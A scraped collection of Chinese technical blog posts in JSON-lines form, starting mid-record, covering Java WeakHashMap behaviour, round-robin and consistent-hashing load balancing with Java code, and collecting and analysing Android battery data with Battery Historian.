\n\n\n来自：\n\n\nhttp://mzlly999.iteye.com/blog/1126049\n\n\n==================================================\n\n\n\n\n\n先把问题说清楚:\n\n\nWeakHashMap是主要通过expungeStaleEntries这个函数的来实现移除其内部不用的条目从而达到的自动释放内存的目的的.基本上只要对WeakHashMap的内容进行访问就会调用这个函数，从而达到清除其内部不在为外部引用的条目。但是如果预先生成了WeakHashMap，而在GC以前又不曾访问该WeakHashMap,那不是就不能释放内存了吗？\n\n\n对应的两个测试案例:\n\n\nWeakHashMapTest1:\n\npublic class WeakHashMapTest1 {public static void main(String[] args) throws Exception {List<WeakHashMap<byte[][], byte[][]>> maps = new ArrayList<WeakHashMap<byte[][], byte[][]>>();for (int i = 0; i < 1000; i++) {WeakHashMap<byte[][], byte[][]> d = new WeakHashMap<byte[][], byte[][]>();d.put(new byte[1000][1000], new byte[1000][1000]);maps.add(d);System.gc();System.err.println(i);}}}\n\n\n由于Java默认内存是64M，所以再不改变内存参数的情况下，该测试跑不了几步循环就内存溢出了。果不其然，WeakHashMap这个时候并没有自动帮我们释放不用的内存。\n\n\nWeakHashMapTest2:\n\npublic class WeakHashMapTest2 {    public static void main(String[] args) throws Exception {        List<WeakHashMap<byte[][], byte[][]>> maps = new ArrayList<WeakHashMap<byte[][], byte[][]>>();        for (int i = 0; i < 1000; i++) {            WeakHashMap<byte[][], byte[][]> d = new WeakHashMap<byte[][], byte[][]>();            d.put(new byte[1000][1000], new byte[1000][1000]);            maps.add(d);            System.gc();            System.err.println(i);            for (int j = 0; j < i; j++) {                System.err.println(j + \" size\" + maps.get(j).size());            }        }    }} \n\n\n这次测试输出正常,不在出现内存溢出问题.\n\n\n总结来说：WeakHashMap并不是你啥也干他就能自动释放内部不用的对象的，而是在你访问它的内容的时候释放内部不用的对象\n\n\n问题讲清楚了,现在我们来梳理一下.了解清楚其中的奥秘.\n\n\nWeakHashMap实现弱引用，是因为它的Entry<K,V>是继承自WeakReference<K>的\n\n\n在WeakHashMap$Entry<K,V>的类定义及构造函数里面是这样写的：\n\nprivate static class Entry<K,V>     extends WeakReference<K>     implements Map.Entry<K,V> Entry(K key, V value, ReferenceQueue<K> queue,int hash, Entry<K,V> next) { super(key, queue); this.value = value; this.hash = hash; this.next = next; }\n\n\n请注意它构造父类的语句：“super(key,\n queue);”，传入的是key，因此key才是进行弱引用的，value是直接强引用关联在this.value之中.在System.gc()时，key中的byte数组进行了回收,而value依然保持(value被强关联到entry上,entry又关联在map中,map关联在arrayList中.).\n\n\n如何证明key中的byte被回收了呢?可以通过内存溢出时导出的内存镜像进行分析,也可以通过如下的小测试得出结论:\n\n\n把上面的value用小对象代替，\n\nfor (int i = 0; i < 10000; i++) {     WeakHashMap<byte[][], Object> d = new WeakHashMap<byte[][], Object>();     d.put(new byte[1000][1000], new Object());     maps.add(d); System.gc();     System.err.println(i); } \n\n\n上面的代码，即使执行10000次也没有问题，证明key中的byte数组确实被回收了。\n\n\nfor循环中每次都new一个新的WeakHashMap，在put操作后，虽然GC将WeakReference的key中的byte数组回收了，并将事件通知到了ReferenceQueue，但后续却没有相应的动作去触发\n WeakHashMap 去处理 ReferenceQueue\n\n\n所以\n WeakReference 包装的key依然存在在WeakHashMap中，其对应的value也当然存在。\n\n\n 那value是何时被清除的呢?\n\n\n对两个例子进行分析可知,例子二中的maps.get(j).size()触发了value的回收,那又如何触发的呢.查看WeakHashMap源码可知,size方法调用了expungeStaleEntries方法,该方法对vm要回收的的entry(quene中)进行遍历,并将entry的value置空,回收了内存.\n\n\n所以效果是key在GC的时候被清除,value在key清除后访问WeakHashMap被清除.\n\n\n疑问:key的quene与map的quene是同一个quene,poll操作会减少一个reference,那问题是key如果先被清除,expungeStaleEntries遍历quene时那个被回收的key对应的entry还能取出来么???\n\n\n关于执行System.GC时,key中的byte数据如何被回收了,请见WeakReference\n referenceQuene\n\n\n来这里：http://www.cnblogs.com/redcreen/archive/2011/02/15/1955289.html\n\n\nWeakHashMappublic class WeakHashMap<K,V>\nextends AbstractMap<K,V>\nimplements Map<K,V>以弱键实现的基于哈希表的 Map。在 WeakHashMap 中，当某个键不再正常使用时，将自动移除其条目。更精确地说，对于一个给定的键，其映射的存在并不阻止垃圾回收器对该键的丢弃，这就使该键成为可终止的，被终止，然后被回收。\n丢弃某个键时，其条目从映射中有效地移除，因此，该类的行为与其他的 Map 实现有所不同。null 值和 null 键都被支持。该类具有与 HashMap 类相似的性能特征,并具有相同的效能参数初始容量 和加载因子。像大多数集合类一样，该类是不同步的。可以使用 Collections.synchronizedMap 方法来构造同步的 WeakHashMap。\n该类主要与这样的键对象一起使用，其 equals 方法使用 == 运算符来测试对象标识。\n一旦这种键被丢弃，就永远无法再创建了，所以，过段时间后在 WeakHashMap 中查找此键是不可能的，不必对其项已移除而感到惊讶。该类十分适合与 equals 方法不是基于对象标识的键对象一起使用，比如，String 实例。\n然而，对于这种可重新创建的键对象，键若丢弃，就自动移除 WeakHashMap 条目，这种表现令人疑惑。WeakHashMap 类的行为部分取决于垃圾回收器的动作，所以，几个常见的（虽然不是必需的）Map 常量不支持此类。因为垃圾回收器在任何时候都可能丢弃键，WeakHashMap 就像是一个被悄悄移除条目的未知线程。\n特别地，即使对 WeakHashMap 实例进行同步，并且没有调用任何赋值方法，在一段时间后 ,size 方法也可能返回较小的值，\n对于 isEmpty 方法，可能返回 false，然后返回 true，对于给定的键，containsKey 方法可能返回 true 然后返回 false，对于给定的键，\nget 方法可能返回一个值，但接着返回 null，对于以前出现在映射中的键，put 方法返回 null，而 remove 方法返回 false，\n对于键集、值集、项集进行的检查，生成的元素数量越来越少。WeakHashMap 中的每个键对象间接地存储为一个弱引用的指示对象。因此，不管是在映射内还是在映射之外，\n只有在垃圾回收器清除某个键的弱引用之后，该键才会自动移除。\n实现注意事项：WeakHashMap 中的值对象由普通的强引用保持。因此应该小心谨慎，确保值对象不会直接或间接地强引用其自身的键，\n因为这会阻止键的丢弃。注意，值对象可以通过 WeakHashMap 本身间接引用其对应的键；\n这就是说，某个值对象可能强引用某个其他的键对象，而与该键对象相关联的值对象转而强引用第一个值对象的键。\n处理此问题的一种方法是，在插入前将值自身包装在 WeakReferences 中，如：m.put(key, new WeakReference(value))，\n然后，分别用 get 进行解包。\n该类所有“collection 视图方法”返回的迭代器均是快速失败的：在迭代器创建之后，\n如果从结构上对映射进行修改，除非通过迭代器自身的 remove 或 add 方法,其他任何时间任何方式的修改，\n迭代器都将抛出 ConcurrentModificationException。因此，面对并发的修改，迭代器很快就完全失败，\n而不是冒着在将来不确定的时间任意发生不确定行为的风险。\n注意，迭代器的快速失败行为不能得到保证，一般来说，存在不同步的并发修改时，不可能作出任何坚决的保证。\n快速失败迭代器尽最大努力抛出 ConcurrentModificationException。因此，编写依赖于此异常程序的方式是错误的，\n正确做法是：迭代器的快速失败行为应该仅用于检测 bug。 注意1:null 值和 null 键都被支持。注意2：不是线程安全的。注意3：迭代器的快速失败行为不能得到保证。注意4：WeakHashMap是无序的。注意5:确保值对象不会直接或间接地强引用其自身的键，因为这会阻止键的丢弃。但是，值对象可以通过 WeakHashMap 本身间接引用其对应的键；这就是说，某个值对象可能强引用某个其他的键对象，而与该键对象相关联的值对象转而强引用第一个值对象的键，这时就形成了环路。处理此问题的一种方法是，在插入前将值自身包装在WeakReferences中，如：m.put(key, new WeakReference(value))，\n然后，分别用 get 进行解包。如实例1.实例1：import java.lang.ref.WeakReference;import java.util.LinkedHashMap;import java.util.Map;import java.util.Random;import java.util.WeakHashMap;import java.util.concurrent.ConcurrentLinkedQueue;public class Test { /**\n  * @param args\n  */ public static void main(String[] args) {  WeakHashMap<Integer,WeakReference<People>> map=new WeakHashMap<Integer,WeakReference<People>>();\n  People p1=new People(“robin”,1,28);\n  People p2=new People(“robin”,2,29);\n  People p3=new People(“harry”,3,30);\n  map.put(new Integer(100), new WeakReference<People>(p1));\n  map.put(new Integer(101), new WeakReference<People>(p2));\n  map.put(new Integer(1), new WeakReference<People>(p3));\n  \n  for(WeakReference<People> rp:map.values())\n  {\n   People p= rp.get();\n   System.out.println(“people:”+p);\n  } }}class People{\n String name;\n int id;\n int age;\n public People(String name,int id)\n {\n  this(name,id,0);\n }\n public People(String name,int id,int age)\n {\n  this.name=name;\n  this.id=id;\n  this.age=age;\n }\n public String toString()\n {\n  return id+name+age;\n }\n public boolean equals(Object o)\n {\n  if(o==null)\n   return false;\n  if(!(o instanceof People))\n   return false;\n  People p=(People)o;\n  boolean res=name.equals(p.name);\n  if(res)\n   System.out.println(“name ”+name+” is double”);\n  else\n   System.out.println(name+” vS ”+p.name);\n  return res;\n }\n public int hashCode()\n {\n  return name.hashCode();\n }\n}\n\n来这里http://hubingforever.blog.163.com/blog/static/1710405792010794452203/ \n             \n                     \n                $(\".MathJax\").remove();", "time": "2018_08_14_11_12_41", "link": "https://blog.csdn.net/JavaMoo/article/details/79494098", "title": "WeakHashMap"}
{"timestamp": "2018_08_14_11_12_41", "desc": "轮询算法是最简单的一种负载均衡算法,它的原理是将用户的请求轮流分配给内部的服务器,并且轮询算法并不需要记录当前所有连接的状态,所以它是一种无状态的调度.\n\n\n\n简单轮询策略\n\n下面是简单轮询算法的实现\n\n\n\npublic class RouteRound implements LoadBalance {\n    private int count = 0;\n\n    @Override\n    public Worker route(String jobId, List<Worker> workers) {\n        int index = count++ % workers.size();\n        return workers.get(index);\n    }\n}\n\n简单轮询算法假设所有的服务器性能都相同,在生产环境下如果所有的服务机器的性能都一样,那么这种算法没有问题,如果服务器性能不同,那么会造成服务器负载不均衡,而基于服务器性能权重的负载均衡算法可以很好的解决这个问题\n\n\n\n权重轮询加权算法\n\n此种算法的思路是对于一组性能权值为{a:2,b:4,c:4}的服务器列表,在十次请求的情况下,a要接收两次请求,b要接收4次请求,c要接收4四次请求\n\n加权轮询算法解决方案如下 \n1. 在服务器数组S中，首先计算所有服务器权重的最大值max(S)，以及所有服务器权重的最大公约数gcd(S)。 \n2. index表示本次请求到来时，选择的服务器的索引，初始值为-1；current_weight表示当前调度的权值，初始值为max(S)。 \n3. 当请求到来时，从index+1开始轮询服务器数组S，找到其中权重大于current_weight的第一个服务器，用于处理该请求。记录其索引到结果序列中。 \n4. 在轮询服务器数组时，如果到达了数组末尾，则重新从头开始搜索，并且减小current_weight的值：current_weight -= gcd(S)。如果current_weight等于0，则将其重置为max(S)。\n\n\n\n/**\n * 获取worker权值列表最大公约数\n *\n * @return\n */\nprivate int getMaxGcd(List<Worker> servers) {\n    int gcd = servers.get(0).getWeight();\n    for (int i = 1; i < servers.size(); i++) {\n        gcd = getGcd(gcd, servers.get(i).getWeight());\n    }\n    return gcd;\n}\n\n\n\n /**\n  * 使用辗转相除法获取两个数的最大公约数\n  *\n  * @param a\n  * @param b\n  * @return\n  */\n private int getGcd(int a, int b){\n     int c;\n     while (b > 0) {\n         c = b;\n         b = a % b;\n         a = c;\n     }\n     return a;\n }\n\n\n\n/**\n * 获取worker列表的最大权重\n *\n * @param servers\n * @return\n */\nprivate int getMaxWeight(List<Worker> servers) {\n    int max = servers.get(0).getWeight();\n    for (int i = 1; i < servers.size(); i++) {\n        if (max < servers.get(i).getWeight())\n            max = servers.get(i).getWeight();\n    }\n    return max;\n}\n\n\n\npublic Worker route(String jobId, List<Worker> workers) {\n    /**\n     * 在第一次调用的情况下,我们需要初始化如下三个参数\n     * 1.最大公约数\n     * 2.最大服务器性能权值\n     * 3. 当前权值\n     */\n    if (curWeight < 0) {\n        maxGcd = getMaxGcd(workers);\n        maxWeight = getMaxWeight(workers);\n        curWeight = maxWeight;\n    }\n    while (true) {\n        for (; curIndex + 1 < workers.size(); ) {\n            curIndex += 1;\n            if (workers.get(curIndex).getWeight() >= curWeight) {\n                return workers.get(curIndex);\n            }\n        }\n        curWeight -= maxGcd;\n        curIndex = -1;\n        if (curWeight <= 0) {\n            curWeight = maxWeight;\n        }\n    }\n}\n\n我们利用上面实现的算法验证下是否达到了我们的需求,对于服务器列表{a,b,c}权值分别为{5,1,1},7次请求调用服务器a,b,c分别应该承受5,1,1次请求\n\n\n\npublic static void main(String[] args) {\n    WeightedRouteRound strategy = new WeightedRouteRound();\n    List<Worker> workers = LoadBalanceUtil.getWorkers();\n    System.out.println(\"show workers >>>\");\n    workers.stream().forEach(System.out::println);\n    System.out.println(\"route >>>\");\n    for (int i = 0; i < 7; i++) {\n        Worker worker = strategy.route(\"jobId\", workers);\n        System.out.println(worker);\n    }\n}\n\n结果如下\n\n\n\nshow workers >>>\nWorker(ip=a, weight=5)\nWorker(ip=b, weight=1)\nWorker(ip=c, weight=1)\nroute >>>\nWorker(ip=a, weight=5)\nWorker(ip=a, weight=5)\nWorker(ip=a, weight=5)\nWorker(ip=a, weight=5)\nWorker(ip=a, weight=5)\nWorker(ip=b, weight=1)\nWorker(ip=c, weight=1)\n\n复合我的预期\n\n\n\n平滑轮询算法\n\n加权轮询算法仍然不完美,它存在着在某一个时间点请求集中的落在权重较高的机器上,我们需要的负载均衡算法有平滑的分配请求的功能,比如对于上述的{a,a,a,a,a,b,c}负载我们希望的结果是{a,a,b,a,c,a,a}\n\n算法如下 \n对于每个服务器有两个权重,一个是服务器性能权重weight,一个是服务器当前权重current_weight(初始值为0)\n\n当请求到来的时候进行如下两步 \n1. 每次当请求到来，选取服务器时，会遍历数组中所有服务器。对于每个服务器,它的currentWeight=currentWeight+Weight；同时累加所有服务器的weight，并保存为total \n2. 遍历完所有服务器之后，如果该服务器的current_weight是最大的，就选择这个服务器处理本次请求。最后把该服务器的current_weight减去total\n\n比如对于服务器权重{4,2,1},该算法分配请求过程如下 \n\n\n\n\n//排序算子，让worker列表按当前权值的从大到小排序\nprivate Comparator<WrapedWorker> cmp = (o1, o2) -> o2.currentWeight - o1.currentWeight;\n\nprivate LinkedList<WrapedWorker> list = new LinkedList<>();\n\nprivate boolean first = true;\n\n@AllArgsConstructor\nprivate class WrapedWorker {\n    Worker worker;\n    int currentWeight;\n    public int getWeight() {\n        return worker.getWeight();\n    }\n}\n@Override\npublic Worker route(String jobId, List<Worker> workers) {\n    /**\n     * 如果是第一次调用该算法,创建对象WrapedWorker列表\n     */\n    if (first) {\n        for (Worker worker : workers) {\n            list.add(new WrapedWorker(worker, 0));\n        }\n        first = false;\n        /**\n         * 创建完所有的WrapedWorker后进行排序\n         */\n        list.sort(cmp);\n    }\n    int count = list.size();\n    int total = 0;\n    /**\n     * 遍历所有的元素,用元素当前权重=元素的权重+元素的当前权重\n     * 同时计算元素权重之和\n     */\n    while (--count >= 0) {\n        WrapedWorker wrapedWorker = list.pollFirst();\n        wrapedWorker.currentWeight = wrapedWorker.getWeight() + wrapedWorker.currentWeight;\n        list.add(wrapedWorker);\n        total += wrapedWorker.currentWeight;\n    }\n    /**\n     * 排序选出最大的临时权重\n     */\n    list.sort(cmp);\n    WrapedWorker worker = list.pollFirst();\n    /**\n     * 最大的临时权重减去所有权重\n     */\n    worker.currentWeight = worker.currentWeight - total;\n    list.add(worker);\n    return worker.worker;\n}\n\n验证算法的可行性\n\n\n\npublic static void main(String[] args) {\n    SmoothWeightedRouteRound strategy = new SmoothWeightedRouteRound();\n    List<Worker> workers = LoadBalanceUtil.getWorkers();\n    for (int i = 0; i < 7; i++) {\n        System.out.println(strategy.route(\"jobId\", workers));\n    }\n}\n\n结果如下\n\n\n\nWorker(ip=a, weight=5)\nWorker(ip=a, weight=5)\nWorker(ip=b, weight=1)\nWorker(ip=a, weight=5)\nWorker(ip=c, weight=1)\nWorker(ip=a, weight=5)\nWorker(ip=a, weight=5)", "time": "2018_08_14_11_12_41", "link": "https://blog.csdn.net/JavaMoo/article/details/79617840", "title": "负载均衡之轮询策略"}
{"timestamp": "2018_08_14_11_12_42", "desc": "说到负载均衡的hash算法,自然会联想起如下这样的算法\n\n\n\nhash(object)%nodeTotal\n\n而在集群中,机器的动态上下线是常见的情况,如果集群是无状态的,那么上述的算法没有问题.但是如果是缓存之类的集群,节点的动态上下线会导致几乎所有的key的重新映射,这样造成的影响是数据错乱,相同备份的数据同时存在于集群中的多个节点,造成内存空间的浪费\n\n为了解决上述的问题,一致性哈希算法就被提出了 \n一致性哈希算法的目标是对于K个请求,节点的上下线只会引起K/nodeTotal的key重新映射,而在节点稳定的时候,同一个key的每次请求映射都是一样的\n\n一致性哈希算法实现原理如下 \n首先将node节点映射到一个圆上(圆的大小是2^32-1),然后将请求object映射到圆上,最后顺时针转动请求,转动的目的是让请求映射到node节点上\n\n原理图如下 \n\n\n上述的算法在node2被删除的情况下回发生什么呢?\n\n它会造成object3的请求映射到node3节点上,并且对于其他的请求没有发生变化,如图所示 \n\n\n如果添加了node4节点请求又会如何发生变化呢?\n\n变化是object2倍映射到node4上,对于其他的请求没有变化 \n\n\n上述的一致性hash算法满足了单调性(单调性是指对于k个请求,n个node,当一个node上线或者下线时只会引起k/n个请求映射发生变化),上述算法看似完美,但还存在一个问题,比如 \n \n对于节点n1,n2.我们有request1,request2,request3,request4四个请求,而四个请求同时落在n2节点上,\n\n为了更好的实现负载均衡,我们需要引入虚拟节点的概念,就是将一个节点虚拟化为多个节点将其中的请求落在N1上,入下图所示 \n\n\n下面是一致性哈希算法的java实现,这里的代码引自xxl-job,jobId就是相当于请求id\n\n首先计算hash,hash在该算法中地位非常重要,它直接影响了node是否能均匀的落在圆上\n\nprivate static long hash(String key) {\n    // md5 byte\n    MessageDigest md5;\n    try {\n        md5 = MessageDigest.getInstance(\"MD5\");\n    } catch (NoSuchAlgorithmException e) {\n        throw new RuntimeException(\"MD5 not supported\", e);\n    }\n    md5.reset();\n    byte[] keyBytes = null;\n    try {\n        keyBytes = key.getBytes(\"UTF-8\");\n    } catch (UnsupportedEncodingException e) {\n        throw new RuntimeException(\"Unknown string :\" + key, e);\n    }\n    //System.out.println(keyBytes.length);\n    md5.update(keyBytes);\n    byte[] digest = md5.digest();\n    //System.out.println(digest.length);\n    // \n    long hashCode = ((long) (digest[3] & 0xFF) << 24)\n            | ((long) (digest[2] & 0xFF) << 16)\n            | ((long) (digest[1] & 0xFF) << 8)\n            | (digest[0] & 0xFF);\n    long truncateHashCode = hashCode & 0xffffffffL;\n    return truncateHashCode;\n}\n\n下面是真正的请求路由,这里的jobId就是相当于requestId\n\n\n\npublic String route(int jobId, ArrayList<String> addressList) {\n    //首先是将node定位到圆上,我们以 hash - address方式定位\n    //因为后面需要获取离jobId最近node所以将数据放入到TreeMap中\n    TreeMap<Long, String> addressRing = new TreeMap<Long, String>();\n    for (String address : addressList) {\n        //将每个node虚拟化为5个节点\n        for (int i = 0; i < VIRTUAL_NODE_NUM; i++) {\n            long addressHash = hash(\"SHARD-\" + address + \"-NODE-\" + i);\n            addressRing.put(addressHash, address);\n        }\n    }\n    long jobHash = hash(String.valueOf(jobId));\n    //这里是顺时针转动jobHash寻找node的策略,其实就是寻找node哈希值大于等于jobId哈希值的最近一个node\n    SortedMap<Long, String> lastRing = addressRing.tailMap(jobHash);\n    if (!lastRing.isEmpty()) {\n        return lastRing.get(lastRing.firstKey());\n    }\n    //如果请求落在最大一组hash上,那么就返回第一个node\n    return addressRing.firstEntry().getValue();\n}\n\n参考http://blog.csdn.net/cywosp/article/details/23397179", "time": "2018_08_14_11_12_42", "link": "https://blog.csdn.net/JavaMoo/article/details/79646095", "title": "负载均衡之一致性哈希算法"}
{"timestamp": "2018_08_14_11_12_42", "desc": "简单来说，Battery historian是一款通过上传bugreport文件分析用户手机中App的电池耗电情况的工具。\n\n那bugreport是什么，从哪里来，怎么用。 \n参照https://www.2cto.com/kf/201607/528696.html的介绍：\n\n\n  Android系统想要成为一个功能完备，生态繁荣的操作系统，那就必须提供完整的应用开发环境。而在应用开发中，app程序的调试分析是日常生产中进程会进行的工作。Android为了方便开发人员分析整个系统平台和某个app在运行一段时间之内的所有信息，专门开发了bugreport工具。这个工具使用起来十分简单，只要在终端执行（linux或者win）： adb bugreport > bugreport.txt， 即可生成bugreport文件。\n  \n  但是有一个问题是，这个生成的文件有的时候异常庞大，能够达到15M+,想一想对于一个txt文本格式的文件内容长度达到了15M+是一个什么概念，如果使用文本工具打开查看将是一个噩梦。因此google针对android 5.0（api 21）以上的系统开发了一个叫做battery historian的分析工具，这个工具就是用来解析这个txt文本文件，然后使用web图形的形式展现出来，这样出来的效果更加人性化，更加可读。\n\n\n一、数据准备：\n\n\n  前提: 手机需要保证是开发者选项模式（安卓手机一般是打开设置，找到关于手机，点击版本号几次，直到出现开发者选项即可）。\n\n\n1.先断开adb服务，然后开启adb服务\n\n\n  (1)adb kill-server \n  (2)adb start-server\n  \n  由于开发时做电量记录是会打开很多可能造成冲突的东西，为了保险起见，重启adb命令。adb devices就会自动连接查找手机，也可以输入adb devices命令确认设备已被adb命令获取到\n\n\n2.重置电池数据、收集数据\n\n\n  (3) adb shell dumpsys batterystats –enable full-wake-history  \n  (4) adb shell dumpsys batterystats –reset \n  (5) adb shell logcat -c \n\n\n通过以上命令来打开电池数据的获取以及重置，清除干扰的数据，清除历史日志。执行的效果如下： \n\n\n3.获取电量报告 \n把数据线拔掉，防止数据线造成充放电数据干扰。然后做一些测试的case，经过一段时间后，重新连接手机确认adb连上了，运行以下命令来将bugreport的信息保存到txt文件中。\n\n\n  (6) adb bugreport >D:/bugreport.txt\n\n\n或者用下面的命令也可以，官网上记述的内容，经实践，无法被读取…\n\n\n  (7) adb shell dumpsys batterystats > batterystats.txt\n  \n  (8) adb shell dumpsys batterystats > com.example.app(包名) >batterystats.txt  \n  ps：在此注意一定要等到该条命令执行完(稍微会有些慢)后，再打开bugreport.txt文件，之前遇到过没有导出完，就点开，信息缺失的情况，导致无法成功生成图表。\n\n\n二、Battery History报告–各个参数的意义\n\n手机系统不同，报告的内容可能会略有不同，图示为5.0.2系统。 \n \n1.横坐标： \n横坐标是一个时间范围。以重置为起点，获取bugreport内容时刻为终点。坐标的间隔，会随着时间的长度发生改标。\n\n2.纵坐标：\n\n\n  重要参数：wake_lock、plugged、battery_level、screen\n\n\n具体说明： \n1.battery_level：电量，可以看出电量的变化。 \n比如图中的数据显示出当前的电量为81%。 \n \n2.plugged：充电状态，这一栏显示是否进行充电，以及充电的时间范围。 \n大图中反应了在某一时间插入了数据线，然后一直持续到数据采集结束。\n\n3.screen：屏幕是否点亮。 \n这一点，可以用于考虑睡眠状态和点亮状态下电量的使用信息。\n\n4.top app：该栏显示当前时刻哪个app处于最上层，就是当前手机运行的app。\n\n\n  用来判断某个app对手机电量的影响，这样也能判断出该app的耗电量信息。该栏记录了应用在某一个时刻启动，以及运行的时间，这对我们比对不同应用对性能的影响有很大的帮助。\n\n\n5.Userspace wakelock:该属性是记录wake_lock模块的工作时间。是否有停止的时候等。\n\n\n  ps：系统为了节省电量，CPU在没有任务忙的时候就会自动进入休眠。有任务需要唤醒CPU高效执行的时候，就会给CPU加wake_lock锁。\n\n\n6.health：电池健康状态的信息，这个信息一定程度上反映了这块电池使用了多长时间。这一栏记录电池状态在何时发生改变，上面的图中电池状态一直处于good状态。\n\n7.plug：充电方式，usb或者插座，以及显示连接的时间。\n\n其余参数（有些参数还没有看到）：\n\n\n\n\n  纵坐标\n  解释\n\n\n\n  CPU runing\n  cpu运行的状态，是否被唤醒\n\n\n  Kernel only uptime\n  只有内核运行时间\n\n\n  Activity Manager Proc\n  活跃的用户进程\n\n\n  Mobile network type\n  网络类型\n\n\n  Mobile radio active\n  移动蜂窝信号 BP侧耗电\n\n\n  Crashes(logcat)\n  某个时间点出现crash的应用\n\n\n  Doze\n  是否进入doze模式\n\n\n  Device active\n  和Doze相反\n\n\n  JobScheduler\n  异步作业调度\n\n\n  SyncManager\n  同步操作\n\n\n  Temp White List\n  电量优化白名单\n\n\n  Phone call\n  是否打电话\n\n\n  GPS\n  是否使用GPS\n\n\n  Network connectivity\n  网络连接状态（wifi、mobile是否连接）\n\n\n  Mobile signal strength\n  移动信号强度（great\\good\\moderate\\poor）\n\n\n  Wifi scan\n  是否在扫描wifi信号\n\n\n  Wifi supplicant\n  是否有wifi请求\n\n\n  Wifi radio\n  是否正在通过wifi传输数据\n\n\n  Wifi signal strength\n  wifi信号强度（great\\good\\moderate\\poor）\n\n\n  Wifi running\n  wifi组件是否在工作(未传输数据)\n\n\n  Wifi on\n  同上\n\n\n  Audio\n  音频是否开启\n\n\n  Camera\n  相机是否在工作\n\n\n  Video\n  是否在播放视频\n\n\n  Foreground process\n  前台进程\n\n\n  Package install\n  是否在进行包安装\n\n\n  Package active\n  包管理在工作\n\n\n  Battery level\n  电池当前电量\n\n\n  Temperature\n  电池温度\n\n\n  Charging on\n  在充电\n\n\n  Logcat misc\n  是否在导出日志\n\n\n\n\n\n  参照链接：http://baijiahao.baidu.com/s?id=1577543442826249969&wfr=spider&for=pc \n  Android电量统计原理：http://duanqz.github.io/2015-07-21-batterystats-part1", "time": "2018_08_14_11_12_42", "link": "https://blog.csdn.net/liangxy2014/article/details/78311938", "title": "battery-historian V2.0的数据获取及参数分析"}
{"timestamp": "2018_08_14_11_12_43", "desc": "摘自官网 \n      Battery Historian 是一个这样的的工具：可以在 Android 5.0 Lollipop（API 级别21）及更高版本的 Android设备上检测与电池相关的信息和事件，而在此期间，该设备没有插上电源。它允许应用程序开发人员在时间轴上可视化系统和应用级别的事件，并使用平移和缩放功能，在设备最后一次完全充电之后，可以轻松地查看各种聚合统计信息，可以选择一个应用程序，检查所选择的应用程序对电池指标的影响。此外，它还允许对两个错误报告进行A/B 比较，突出显示了关键电池相关指标的差异。\n\n\n目前工作中使用的电量测试工具为battery-historian 2.0。在经历了多半天的环境搭建之后，现在准备记录下咯。 \n官网地址：https://github.com/google/battery-historian。 有兴趣的，英文棒的，可以直奔官网~\n\n再次提示：以下内容是Windows的环境搭建。 \n1. 安装Go \n2. 安装git \n3. 安装python2.7 \n4. 安装java环境\n\n一、详细步骤开始啦： \n1.安装Go环境\n\n\nBattery Historian V2.0有部分内容是使用Go语言编写的，所以需要先安装Go开发环境，下载地址http://golang.org/doc/install (貌似需翻墙)，我选择的是go1.9.1.windows-amd64.msi版本，所以使用msi版，听说是安装方便，默认会帮我们配置好环境变量；点击下一步就ok的。\n\n\n  ps：默认的安装路径是C:\\Go，我这边在安装完成后自动的在环境变量里配置path和GOROOT，如果未配置需手动配置\n\n安装完成后，检查环境变量，共3项内容： Path、GOROOT、GOPATH；GOPATH是手动配置的，方便之后从git下载代码。\n\n\n  a. GOROOT的作用是告诉Go 命令和其他相关工具，在哪里去找到安装在你系统上的Go包,所以这里配置的是GO的安装目录 \n   b.GOPATH可以简单理解为是工程的目录，所以创建一个GO的工程路径\n\n \n\n验证环境安装成功：在cmd命令行，输入go help，或者是 go version，如图，证明已安装成功。\n    \n为了检测Go环境是否能够正常编译运行，在GOPATH相应的目录下，新建hello.go文件（新建txt文件，更改文件名后缀），代码内容如下：\n\n在cmd命令行切换至hello.go的目录，执行go run hello.go，会输入码农熟悉的 hello，world\n输入go build hello.go,会在目录下生成一个.exe文件，but 我不知道有什么用\n\nGo环境，全部OK~\n\n\n2.安装git \n  (1)官方下载地址：https://git-scm.com/download/win  亲测无墙~ \n (2)安装完成检查：命令行输入git version，如果可显示版本号，则成功；不成功的话，在环境变量的path里加入 git下bin目录。 \n \n\n3.安装Python环境 \n(1)下载python，地址：https://www.python.org/，无墙可访问，ps：注意下载python 2.7版本，3.X版本不支持 \n(2)配置环境变量，添加python路径，cmd命令行输入python，显示python版本号等信息时，说明环境已ok。\n\n4.安装java环境 \n   自行百度咯\n\n二、下载Battery Historian源码并运行\n\n1.在GOPATH的目录，即刚才hello.go所在目录下运行 git bash here，或者使用git命令切换至hello.go所在目录 \n\n\n2.在命令行输入 go get-d -u github.com/google/battery-historian/… (最新官方文档里是有  … 的，需加上)。\n\n3.在命令行输入 cd $GOPATH/src/github.com/google/battery-historian，进入到battery-historian目录下\n\n4.执行go run setup.go, 需翻墙下载，与网络可能也有关系，第一次下载特别慢，多等待会，30分钟也是有可能的。\n\n\n  手动下载的话，从 setup.go文件中可以找到下载地址（不确定是否可行） a. \n  http://dl.google.com/closure-compiler/compiler-20160208.zip b. \n  https://github.com/google/closure-library c. \n  https://github.com/xuanluo/flot-axislabels.git\n\n\n5.下载完成后，执行go run cmd/battery-historian/battery-historian.go，会出现端口号信息。 \n \n\n\n6.登录http://localhost:9999查看是否正常，正常显示如图。\n\n\n  kernel wakesource trace–内核跟踪分析，主要分析wakeup source和wakelock activities，貌似需要手机root，查到的相关链接：https://www.2cto.com/kf/201607/528696.html。\n  \n  power monitor file–电力监测分析，查到的相关链接：http://blog.csdn.net/u013474104/article/details/52325911\n  \n  这两者都还未用过，不了解 \n\n\n7.上传bugreport文件至http://localhost:9999，获取bugreport文件在另一篇中描述。点击Browse，选择文件。若点击无效，试试别的浏览器。然后点击submit，开始进行分析，分析会有些慢，稍等片刻。先看下效果吧\n\n\n\n截至当前，Battery Historian项目算是跑起来了~ \n有木有一点欣慰~\n\nps:看到了很简洁的描述，附上。\n\n\n  Battery historian是一款通过上传bugreport文件分析用户手机中App的电池耗电情况的工具。\n  \n  Battery Historian 1.0 通过python脚本转换成html文件，而新版本 Battery Historian 2.0 发布了，新版本带来了很多的改进：更清晰的报告，每个应用程序的摘要，更快的执行等等。", "time": "2018_08_14_11_12_43", "link": "https://blog.csdn.net/liangxy2014/article/details/78307392", "title": "Android电量测试之battery-historian V2.0 Windows环境搭建"}
